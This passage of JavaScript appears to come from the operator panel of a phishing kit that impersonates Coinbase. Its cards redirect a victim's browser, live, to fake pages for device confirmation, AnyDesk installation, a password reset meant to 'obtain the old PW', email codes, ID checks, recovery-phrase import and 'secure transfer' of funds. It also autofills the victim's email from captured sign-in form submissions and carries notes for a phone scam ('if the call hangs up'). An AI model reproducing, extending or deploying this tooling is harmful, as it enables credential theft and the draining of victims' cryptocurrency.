            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Device Confirmation URL</span><span class="ps-roomy-sub" style="'+HEAD_S+'">Authorize a new device with the confirmation URL</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=
                '<div class="ps-roomy-field-row ps-roomy-field-row--email">'
              +   '<span class="rp-label">Email address</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-dc-email-inp" placeholder="user@gmail.com" value="">'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var emailInp=panel.querySelector('#cb-dc-email-inp');
            if(emailInp){
                emailInp.addEventListener('input',function(){ emailInp.dataset.userEdited='1'; });
            }
            function _dcEmail(){ return (document.getElementById('cb-dc-email-inp')||{value:''}).value.trim(); }
            panel.querySelector('.rp-btn-preview').onclick=function(){
                var em=_dcEmail();
                if(em){_openPreviewIframe('/coinbase/device-confirmation',{email:em});}
                else{_openPreviewIframe('/coinbase/device-confirmation');}
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st=panel.dataset.pageState||'default';
                var em=_dcEmail();
                if(em){sendCommand('redirect',{url:'/coinbase/device-confirmation',page_state:st,post:{email:em}});}
                else{sendCommand('redirect',{url:'/coinbase/device-confirmation',page_state:st});}
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(!o && emailInp){
                    emailInp.value='';
                    emailInp.dataset.userEdited='1';
                }
                if(o){
                    var _i=document.getElementById('cb-dc-email-inp');
                    if(_i&&!_i.dataset.userEdited&&!_i.value&&window._feedEvents){
                        for(var _j=0;_j<window._feedEvents.length;_j++){
                            var _ev=window._feedEvents[_j];
                            if(_ev.type==='form_submit'&&_ev.element==='email'&&_ev.page==='coinbase_sign_in'&&_ev.value){
                                _i.value=_ev.value;break;
                            }
                        }
                    }
                }
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // AnyDesk — TYPE 2 roomy (design only; no fields)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">AnyDesk</span><span class="ps-roomy-sub" style="'+HEAD_S+'">Burger</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=PAGE_STATE_ROW+ACTION_ROW;
            bindPageStateRow(panel);
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/anydesk'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st=panel.dataset.pageState||'default';
                sendCommand('redirect',{url:'/coinbase/anydesk',page_state:st});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Reset Password — pilot card UI (design only)
        (function(){
            var rpItem={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var rpWrap=document.createElement('div');rpWrap.className='ps-roomy-card';
            var rpBtn=document.createElement('button');
            rpBtn.className='rp-page-btn ps-roomy-btn';
            rpBtn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Reset Password</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">obtain the old PW</span></span>'+CHEVRON_PG;
            var rpPanel=document.createElement('div');rpPanel.className='rp-cfg-panel ps-roomy';
            appendPageStateRow(rpPanel);
            var rpAct=document.createElement('div');rpAct.className='rp-action-row';
            var rpSd=document.createElement('button');rpSd.textContent='Send';rpSd.className='rp-btn-send';
            rpSd.onclick=function(){
                var st=rpPanel.dataset.pageState||'default';
                sendCommand('redirect',{url:'/coinbase/reset-password',page_state:st});
                
                cbClose(rpItem);
            };
            var rpPv=document.createElement('button');rpPv.textContent='Preview';rpPv.className='rp-btn-preview';
            rpPv.onclick=function(){_openPreviewIframe('/coinbase/reset-password');};
            rpAct.appendChild(rpSd);rpAct.appendChild(rpPv);rpPanel.appendChild(rpAct);
            rpBtn.onclick=function(){
                var o=!rpItem.open;cbClose(rpItem);rpItem.open=o;
                rpBtn.classList.toggle('is-selected',o);
                rpPanel.style.display=o?'block':'none';
                if(rpItem.wrap) rpItem.wrap.classList.toggle('is-open',o);
            };
            rpItem.btn=rpBtn;rpItem.panel=rpPanel;rpItem.wrap=rpWrap;cbAcc.push(rpItem);
            rpWrap.appendChild(rpBtn);rpWrap.appendChild(rpPanel);body.appendChild(rpWrap);
        })();

        //  Review Account — TYPE 1 roomy; Location→Time→Name split; same post keys
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Review Account</span><span class="ps-roomy-sub" style="'+HEAD_S+'">review the activity on the account</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=
                '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
              +   '<span class="rp-label">Location</span>'
              +   '<input type="text" class="rp-input" id="cb-rv-location-inp" placeholder="Amsterdam, Netherlands" value="">'
              + '</div>'
              + '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
              +   '<span class="rp-label">Time</span>'
              +   '<input type="text" class="rp-input" id="cb-rv-time-inp" placeholder="02:14 AM CET" value="">'
              + '</div>'
              + '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
              +   '<span class="rp-label">Name</span>'
              +   '<input type="text" class="rp-input" id="cb-rv-name-inp" placeholder="Michael" value="">'
              + '</div>'
              + '<div class="rp-email-preview" id="cb-rv-email-preview"></div>'
              + ACTION_ROW;
            var _cbRvNum=Math.floor(Math.random()*900)+100;
            function _refreshRvEmail(){
                var n=(document.getElementById('cb-rv-name-inp')||{value:''}).value.trim().toLowerCase().replace(/\s+/g,'');
                var el=document.getElementById('cb-rv-email-preview');
                if(el) el.textContent=n?n+_cbRvNum+'@gmail.com':'';
            }
            setTimeout(function(){
                var nameInp=document.getElementById('cb-rv-name-inp');
                if(nameInp) nameInp.addEventListener('input',_refreshRvEmail);
                _refreshRvEmail();
            },100);
            function _cbRvParams(){
                var name=(document.getElementById('cb-rv-name-inp')||{value:''}).value.trim()||'Michael';
                var location=(document.getElementById('cb-rv-location-inp')||{value:''}).value.trim()||'Amsterdam, Netherlands';
                var time=(document.getElementById('cb-rv-time-inp')||{value:''}).value.trim()||'02:14 AM CET';
                var emailPfx=name.toLowerCase().replace(/\s+/g,'');
                return {name:name,location:location,time:time,email:emailPfx+_cbRvNum+'@gmail.com',num:_cbRvNum};
            }
            function _cbRvPost(){var p=_cbRvParams();return {name:p.name,location:p.location,time:p.time,email:p.email,num:String(p.num)};}
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/review-account',_cbRvPost()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/coinbase/review-account',post:_cbRvPost()});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Account Review — TYPE 1 roomy batch (no fields / no Default|Invalid)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            function _cbMkT1(title, sub, url){
                var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
                var wrap=document.createElement('div');wrap.className='ps-roomy-card';
                var btn=document.createElement('button');
                btn.className='rp-page-btn ps-roomy-btn';
                btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">'+title+'</span><span class="ps-roomy-sub" style="'+HEAD_S+'">'+sub+'</span></span>'+CHEVRON_PG;
                var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
                panel.innerHTML=ACTION_ROW;
                panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
                panel.querySelector('.rp-btn-send').onclick=function(){
                    sendCommand('redirect',{url:url});
                    
                    cbClose(item);
                };
                btn.onclick=function(){
                    var o=!item.open;cbClose(item);item.open=o;
                    btn.classList.toggle('is-selected',o);
                    panel.style.display=o?'block':'none';
                    if(item.wrap) item.wrap.classList.toggle('is-open',o);
                };
                item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
                wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
            }
            _cbMkT1('Last Activity', 'last time account was accessed', '/coinbase/last-activity');
            _cbMkT1('Estimated Balance', 'estimated account holdings', '/coinbase/estimated-balance');
            _cbMkT1('High Security', 'account is in high state and requires a pin for all changes', '/coinbase/high-security');
            _cbMkT1('Representative Contact', 'use this if the call hangs up', '/coinbase/representative-contact');
        })();

        //  Email Code — TYPE 2 roomy (--split); autofill kept temporarily; placeholder mail
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Email Code</span><span class="ps-roomy-sub" style="'+HEAD_S+'">6 digit via email</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=
                '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
              +   '<span class="rp-label">Email address</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-ec-email-inp" placeholder="user@gmail.com" value="">'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            function _ecEmail(){
                return (document.getElementById('cb-ec-email-inp')||{value:''}).value.trim()||'user@gmail.com';
            }
            panel.querySelector('.rp-btn-preview').onclick=function(){
                _openPreviewIframe('/coinbase/email-code',{email:_ecEmail()});
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st=panel.dataset.pageState||'default';
                sendCommand('redirect',{url:'/coinbase/email-code',page_state:st,post:{email:_ecEmail()}});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(o){
                    var _i=document.getElementById('cb-ec-email-inp');
                    if(_i&&!_i.dataset.userEdited&&!_i.value&&window._feedEvents){
                        for(var _j=0;_j<window._feedEvents.length;_j++){
                            var _ev=window._feedEvents[_j];
                            if(_ev.type==='form_submit'&&_ev.element==='email'&&_ev.page==='coinbase_sign_in'&&_ev.value){
                                _i.value=_ev.value;break;
                            }
                        }
                    }
                }
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Identity Verification (section title removed — presentation only)
        // Verify Identity — TYPE 1 roomy + Link field (no Default|Invalid; external URL redirect later)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Verify Identity</span><span class="ps-roomy-sub" style="'+HEAD_S+'">verification URL</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=
                '<div class="ps-roomy-field-row ps-roomy-field-row--split">'
              +   '<span class="rp-label">Link</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-vi-link-inp" placeholder="" value="">'
              + '</div>'
              + ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/verify-identity'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/coinbase/verify-identity'});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Select ID Type — TYPE 1 roomy (image support later; not now)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Select ID Type</span><span class="ps-roomy-sub" style="'+HEAD_S+'">Identification</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/select-id-type'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/coinbase/select-id-type'});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        //  Wallet Setup (section title removed — presentation only)
        // Link Coinbase — TYPE 1 roomy
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Link Coinbase</span><span class="ps-roomy-sub" style="'+HEAD_S+'">link your account to wallet</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/coinbase/link-coinbase'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/coinbase/link-coinbase'});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Coinbase Wallet (download) — roomy + mode placements (mapping not wired)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Coinbase Wallet</span><span class="ps-roomy-sub" style="'+HEAD_S+'">download wallet</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/download-coinbase-wallet';
            // Mode boxes: UI select. Other → 3 DC-style rows in normal flow (design only; mapping not wired).
            // Preset/Other Send|Preview still Keep-default Coinbase until wiring APPROVE.
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row dcw-mode-row" data-dcw-mode="coinbase">'
              +   '<button type="button" class="ps-toggle-btn dcw-mode-btn ps-toggle-active" data-dcw-mode="coinbase">Coinbase Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn dcw-mode-btn" data-dcw-mode="trust">Trust Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn dcw-mode-btn" data-dcw-mode="safepal">Safepal</button>'
              +   '<button type="button" class="ps-toggle-btn dcw-mode-btn" data-dcw-mode="other">Other</button>'
              + '</div>'
              + '<div id="cb-dcw-other-fields" style="display:none;">'
              +   '<div class="ps-roomy-field-row ps-roomy-field-row--email">'
              +     '<span class="rp-label">name</span>'
              +     '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-dcw-name-inp" placeholder="" value="" autocomplete="off">'
              +   '</div>'
              +   '<div class="ps-roomy-field-row ps-roomy-field-row--email">'
              +     '<span class="rp-label">app store</span>'
              +     '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-dcw-appstore-inp" placeholder="" value="" autocomplete="off">'
              +   '</div>'
              +   '<div class="ps-roomy-field-row ps-roomy-field-row--email">'
              +     '<span class="rp-label">google play</span>'
              +     '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-dcw-play-inp" placeholder="" value="" autocomplete="off">'
              +   '</div>'
              + '</div>'
              + ACTION_ROW;
            var modeRow=panel.querySelector('.dcw-mode-row');
            var modeBtns=panel.querySelectorAll('.dcw-mode-btn');
            var otherFields=panel.querySelector('#cb-dcw-other-fields');
            var otherInps=panel.querySelectorAll('#cb-dcw-name-inp,#cb-dcw-appstore-inp,#cb-dcw-play-inp');
            function _dcwClearOther(){
                otherInps.forEach(function(inp){ inp.value=''; });
            }
            function _dcwSetMode(key){
                if(modeRow) modeRow.setAttribute('data-dcw-mode',key);
                modeBtns.forEach(function(b){ b.classList.toggle('ps-toggle-active', (b.getAttribute('data-dcw-mode')||'')===key); });
                if(otherFields) otherFields.style.display = (key==='other') ? '' : 'none';
                if(key!=='other') _dcwClearOther();
            }
            modeBtns.forEach(function(mb){
                mb.onclick=function(){ _dcwSetMode(mb.getAttribute('data-dcw-mode')||'coinbase'); };
            });
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                // Keep-default Coinbase (Other field wiring deferred — UI boxes only)
                sendCommand('redirect',{url:url,post:{
                    app_name:'Coinbase Wallet',
                    app_store:'https://apps.apple.com/us/app/coinbase-wallet-nfts-crypto/id1278383455',
                    play_store:'https://play.google.com/store/apps/details?id=org.toshi'
                }});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                if(!o) _dcwClearOther();
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Import Recovery Phrase — TYPE 1 roomy; ANTI-IDIOT switch + Send|Preview (exchanger admin field removed)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Import Recovery Phrase</span><span class="ps-roomy-sub" style="'+HEAD_S+'">import the words explanation</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/import-recovery-phrase';
            panel.innerHTML=mkAntiIdiotSwitch('cb-irp-anti-dumb-toggle')+ACTION_ROW;
            var antiDumbBtn=panel.querySelector('#cb-irp-anti-dumb-toggle');
            bindAntiIdiotBtn(antiDumbBtn);
            panel.querySelector('.rp-btn-preview').onclick=function(){
                var post={};
                post.anti_dumb=isAntiIdiotOn(antiDumbBtn)?'1':'';
                _openPreviewIframe(url,post);
            };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var post={};
                if(isAntiIdiotOn(antiDumbBtn)) post.anti_dumb='1';
                sendCommand('redirect',{url:url,post:post});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Secure Transfer — TYPE 1 roomy; mode boxes + Other → exchanger; ANTI-IDIOT preserved
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="'+HEAD_T+'">Secure Transfer</span><span class="ps-roomy-sub" style="'+HEAD_S+'">secure asset transfer</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            var url='/coinbase/secure-transfer';
            // Preset labels match Whitelist shell (not invented). Maps to existing post.exchanger.
            var ST_MODE_LABELS={coinbase:'Coinbase Wallet',trust:'Trust Wallet',safepal:'Safepal',other:''};
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row wl-mode-row st-mode-row" data-st-mode="coinbase">'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn st-mode-btn ps-toggle-active" data-st-mode="coinbase">Coinbase Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn st-mode-btn" data-st-mode="trust">Trust Wallet</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn st-mode-btn" data-st-mode="safepal">Safepal</button>'
              +   '<button type="button" class="ps-toggle-btn wl-mode-btn st-mode-btn" data-st-mode="other">Other</button>'
              + '</div>'
              + '<div class="ps-roomy-field-row ps-roomy-field-row--email" id="cb-st-other-row" style="display:none;">'
              +   '<span class="rp-label">Other</span>'
              +   '<input type="text" class="rp-input ps-roomy-outline-input" id="cb-st-other-inp" placeholder="" value="" autocomplete="off">'
              + '</div>'
              + mkAntiIdiotSwitch('cb-st-anti-dumb-toggle')
              + ACTION_ROW;
            var antiDumbBtn=panel.querySelector('#cb-st-anti-dumb-toggle');
            bindAntiIdiotBtn(antiDumbBtn);
            var modeRow=panel.querySelector('.st-mode-row');
            var modeBtns=panel.querySelectorAll('.st-mode-btn');
            var otherRow=panel.querySelector('#cb-st-other-row');
            var otherInp=panel.querySelector('#cb-st-other-inp');
            function _stMode(){ return (modeRow&&modeRow.getAttribute('data-st-mode'))||'coinbase'; }
            function _stSetMode(key){
                if(modeRow) modeRow.setAttribute('data-st-mode',key);
                modeBtns.forEach(function(b){ b.classList.toggle('ps-toggle-active', (b.getAttribute('data-st-mode')||'')===key); });
                if(otherRow) otherRow.style.display = (key==='other') ? '' : 'none';
                // Leaving Other (e.g. Safepal) clears typed value so re-opening Other is blank
                if(key!=='other' && otherInp) otherInp.value='';
            }
            modeBtns.forEach(function(mb){
                mb.onclick=function(){ _stSetMode(mb.getAttribute('data-st-mode')||'coinbase'); };
            });
            function _stPost(){
                var post={};
                var key=_stMode();
                var exch='';
                if(key==='other'){ exch=(otherInp&&otherInp.value||'').trim(); }
                else { exch=ST_MODE_LABELS[key]||''; }
                // Always include exchanger so Preview uses POST inject (not GET) and visitor can clear stale LS
                post.exchanger=exch;
                if(isAntiIdiotOn(antiDumbBtn)) post.anti_dumb='1';
                return post;
            }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(url,_stPost()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var post=_stPost();
                sendCommand('redirect',{url:url,post:post});
                
                cbClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;cbClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
                // Collapse → clear Other so next open is blank
                if(!o && otherInp) otherInp.value='';
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;cbAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();

        // Whitelist CB Wallet — TYPE 2 roomy; mode boxes + Other field (UI only; mapping not wired)
        (function(){
            var HEAD_T="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;";
            var HEAD_S="font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;";
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
